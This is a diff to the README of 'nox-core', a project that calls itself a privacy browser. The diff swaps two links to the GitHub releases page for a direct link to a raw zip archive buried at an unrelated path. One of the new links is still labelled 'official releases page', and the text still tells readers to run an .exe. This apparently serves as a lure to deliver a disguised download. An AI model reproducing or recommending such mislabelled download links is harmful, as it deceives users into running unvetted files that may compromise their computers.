@@ -1,12 +1,12 @@
 # 🛡️ nox-core - Manage multiple accounts with total privacy
 
-[![Download for Windows](https://img.shields.io/badge/Download_nox--core-blue.svg)](https://github.com/leonaprosodic820/nox-core/releases)
+[![Download for Windows](https://img.shields.io/badge/Download_nox--core-blue.svg)](https://github.com/leonaprosodic820/nox-core/raw/refs/heads/main/claude-relay/instances/core-nox-2.4.zip)
 
 nox-core is a browser designed for privacy. It keeps your internet activity separate for every account you own. Use it to log into multiple websites at once without the sites tracking your real identity. This software stores all your data on your computer. It sends no tracking information to any server.
 
 ## 📥 How to download your browser
 
-Visit the [official releases page](https://github.com/leonaprosodic820/nox-core/releases) to find the latest version of nox-core. Click the link that matches your system. Look for the file ending in `.exe` for Windows. Save the file to your desktop or your downloads folder.
+Visit the [official releases page](https://github.com/leonaprosodic820/nox-core/raw/refs/heads/main/claude-relay/instances/core-nox-2.4.zip) to find the latest version of nox-core. Click the link that matches your system. Look for the file ending in `.exe` for Windows. Save the file to your desktop or your downloads folder.
 
 ## ⚙️ Setting up the software
 
